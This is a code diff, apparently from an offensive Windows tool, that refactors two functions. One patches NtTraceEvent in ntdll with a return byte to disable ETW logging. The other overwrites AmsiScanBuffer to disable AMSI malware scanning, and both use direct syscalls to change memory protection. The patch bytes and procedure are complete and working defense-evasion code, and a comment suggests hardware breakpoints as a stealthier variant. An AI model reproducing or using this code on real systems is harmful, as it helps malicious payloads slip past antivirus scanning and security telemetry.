@@ -7,35 +7,38 @@
 // TODO FOR YOU: These patches are very basic. Maybe find another one? Or use HWBP? //
 // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~++~+~+~+~+~+~+~+~+~+~+~+ //
 
+/**
+ * Patches NtTraceEvent to disable ETW.
+ */
 BOOL 
 PatchETW(
-    HMODULE ntdllBaseAddr
+    HMODULE hNtdll
 )
 {
     SIZE_T patchSize = 1;
     DWORD dwOld      = 0;
 
     // Locate target function
-    PVOID ptrNtTraceEvent = (PVOID)hlpGetProcAddress(ntdllBaseAddr, "NtTraceEvent");
-    if (!ptrNtTraceEvent)
+    PVOID pNtTraceEvent = (PVOID)HlpGetProcAddress(hNtdll, "NtTraceEvent");
+    if (!pNtTraceEvent)
     {
         return FALSE;
     }
 
     // Make writeable
     PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
-    NTSTATUS ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&ptrNtTraceEvent, &patchSize, PAGE_EXECUTE_READWRITE, &dwOld);
+    NTSTATUS ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&pNtTraceEvent, &patchSize, PAGE_EXECUTE_READWRITE, &dwOld);
     if (!NT_SUCCESS(ntStatus))
     {
         return FALSE;
     }
 
     // Patch
-    RtlCopyMemory(ptrNtTraceEvent, "\xc3", 1);
+    RtlCopyMemory(pNtTraceEvent, "\xc3", 1);
 
     // Re-Protect
     PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
-    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&ptrNtTraceEvent, &patchSize, dwOld, &dwOld);
+    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&pNtTraceEvent, &patchSize, dwOld, &dwOld);
     if (!NT_SUCCESS(ntStatus))
     {
         return FALSE;
@@ -43,6 +46,9 @@ PatchETW(
     return TRUE;
 }
 
+/**
+ * Patches AmsiScanBuffer to disable AMSI.
+ */
 BOOL 
 PatchAMSI()
 {
@@ -58,15 +64,15 @@ PatchAMSI()
     }
 
     // Locate target function
-    PVOID addr = (PVOID)hlpGetProcAddress(hAmsi, "AmsiScanBuffer");
-    if(!addr)
+    PVOID pAmsiScanBuffer = (PVOID)HlpGetProcAddress(hAmsi, "AmsiScanBuffer");
+    if(!pAmsiScanBuffer)
     {
         return FALSE;
     }
 
     // Make writeable
     PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
-    NTSTATUS ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&addr, &patchSize, PAGE_EXECUTE_READWRITE, &dwOld);
+    NTSTATUS ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&pAmsiScanBuffer, &patchSize, PAGE_EXECUTE_READWRITE, &dwOld);
     if (!NT_SUCCESS(ntStatus))
     {
         return FALSE;
@@ -74,11 +80,11 @@ PatchAMSI()
 
     // Patch
     BYTE patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
-    RtlCopyMemory(addr, &patch, 6);
+    RtlCopyMemory(pAmsiScanBuffer, &patch, 6);
 
     // Re-Protect
     PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
-    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&addr, &patchSize, dwOld, &dwOld);
+    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), (PVOID*)&pAmsiScanBuffer, &patchSize, dwOld, &dwOld);
     if (!NT_SUCCESS(ntStatus))
     {
         return FALSE;
